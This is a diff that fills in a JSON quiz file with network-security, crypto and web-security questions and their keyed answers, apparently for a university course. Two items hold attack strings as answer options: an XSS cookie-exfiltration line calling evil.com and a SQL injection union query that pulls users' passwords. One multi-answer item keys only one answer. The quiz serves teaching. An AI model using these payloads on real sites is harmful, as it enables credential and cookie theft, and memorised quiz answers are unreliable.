@@ -61,106 +61,106 @@
         "photoURL": "q8q10"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Network packet spoofing is",
+        "answers": ["An Authenticity / Integrity problem", "An Availability problem", "A Confidentiality problem", "Not a problem"],   
+        "correctAnswer": "An Authenticity / Integrity problem",
+        "photoURL": "q8q11"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "What is the best defense for Volume-based DDoS?",
+        "answers": ["CDNs", "Syn Cookies", "Disabling computationally intensive algorithms", "More human operators"],   
+        "correctAnswer": "CDNs",
+        "photoURL": "q8q12"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "After my firewall rules for blocking incoming traffic, I added a catch all to allow the rest of the traffic in. This is:",
+        "answers": ["Good, let networks do their networking!", "Bad, violates the Fail-Safe Defaults principle", "Good, it follows the Defense in Depth principle", "Bad, violates the Separation of Duty principle"],   
+        "correctAnswer": "Bad, violates the Fail-Safe Defaults principle",
+        "photoURL": "q8q13"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Το νέο antivirus που αγόρασα για το PC μου διαφημίζει ότι έχει firewall. Τι τύπου firewall είναι;",
+        "answers": ["Άγνωστο", "Host-based", "Network-based", "DoS"],   
+        "correctAnswer": "Host-based",
+        "photoURL": "q8q14"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Προσέθεσα ένα firewall στην στοίβα του συστήματός μου. Το σύστημά μου είναι σίγουρα πιο ασφαλές",
+        "answers": ["True", "False"],   
+        "correctAnswer": "False",
+        "photoURL": "q8q15"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Προκειμένου να προκαλέσουν unavailability σε κάποιο site, τα BotNets πρέπει να στείλουν πακέτα στον \"server στόχο\"",
+        "answers": ["True", "False"],   
+        "correctAnswer": "False",
+        "photoURL": "q8q16"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Κάνω videocall και όλη η κίνησή μου είναι κρυπτογραφημένη με TLS και τρέχει πάνω σε TCP. Ένας ωτακουστής μπορεί:",
+        "answers": ["Να δει την κίνηση αλλά δεν ξέρει τίποτα για αυτήν λόγω encryption", "Να δει τα μεγέθη των πακέτων και να εκμαιεύσει στοιχεία της συνομιλίας", "Να προκαλέσει packet fragmentation προκειμένου να σπάσει το encryption", "Τι είναι ο ωτακουστής;;"],   
+        "correctAnswer": "Να δει τα μεγέθη των πακέτων και να εκμαιεύσει στοιχεία της συνομιλίας",
+        "photoURL": "q8q17"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Μόλις κατάφερα να κάνω ένα stored XSS attack στο eclass.uoa.gr. Για να πάρω τα cookies από το instagram, τρέχω το attack",
+        "answers": ["Δεν έχω attack λόγω Same Origin Policy", "<script> alert(document.cookie) </script>", "<script> fetch('https://evil.com/' + document.cookie) </script>", "<script> fetch('https://instagram.com/' + document.cookie) </script>"],   
+        "correctAnswer": "Δεν έχω attack λόγω Same Origin Policy",
+        "photoURL": "q8q18"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Ένας IDS αλγόριθμος που εντοπίζει όλα τα συμβάντα και στέλνει alerts λέγεται",
+        "answers": ["Sound", "Complete"],   
+        "correctAnswer": "Complete",
+        "photoURL": "q8q19"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "We noticed attackers always use UDP for their attacks. We included this detail in our adversary model. This is",
+        "answers": ["Good, taking into account the adversary's strategy is key", "Bad, including the adversary's strategy is a mistake"],   
+        "correctAnswer": "Bad, including the adversary's strategy is a mistake",
+        "photoURL": "q8q20"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "The use of stack canaries raises the bar for the adversary",
+        "answers": ["True", "False"],   
+        "correctAnswer": "True",
+        "photoURL": "q8q21"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "In most protocols, communication starts with asymmetric crypto and then switches to symmetric crypto. This is because: (more than 1 correct)",
+        "answers": ["Asymmetric crypto is insecure", "We confuse the adversary by switching between encryption modes", "Symmetric crypto is more performant", "We need the asymmetric part to exchange keys for the symmetric part"],   
+        "correctAnswer": "Symmetric crypto is more performant",
+        "photoURL": "q8q22"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Λέω να χρησιμοποιήσω δίδυμους πρώτους (p, p+2) ως το ζευγάρι πρώτων στο RSA (N = p * (p+2)). Καλή ιδέα;",
+        "answers": ["True", "False"],   
+        "correctAnswer": "False",
+        "photoURL": "q8q23"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "We blocked the keyword \"or\" from our input strings to block injections. Can you still SQL inject me?",
+        "answers": ["' or 1=1 --", "'' or '1' = '1", "'' union select user, pass from users --", "No, this defense creates an impregnable fortress"],   
+        "correctAnswer": "'' union select user, pass from users --",
+        "photoURL": "q8q24"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "Security mechanism classification categories: (1) prevention, (2) detection, (3) ..., and (4) deterrence. What is (3)?",
+        "answers": ["Mitigation", "Response", "Reaction", "Resilience"],   
+        "correctAnswer": "Resilience",
+        "photoURL": "q8q25"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "I forget, what am I supposed to do?",
+        "answers": ["encrypt then mac", "mac then encrypt", "encrypt AND mac", "what?"],   
+        "correctAnswer": "encrypt then mac",
+        "photoURL": "q8q26"
     }, 
     {
-        "question": "",
-        "answers": ["", "", "", ""],   
-        "correctAnswer": "",
-        "photoURL": ""
+        "question": "mem[0x42424242] = 0x43434343 και eax = 0x42424242, Μετά την εντολή lea %ebx, (%eax) η τιμή του %ebx είναι:",
+        "answers": ["0x42424242", "0x43434343", "0x41414141", "Άγνωστη"],   
+        "correctAnswer": "0x42424242",
+        "photoURL": "q8q27"
     }
 
 ]
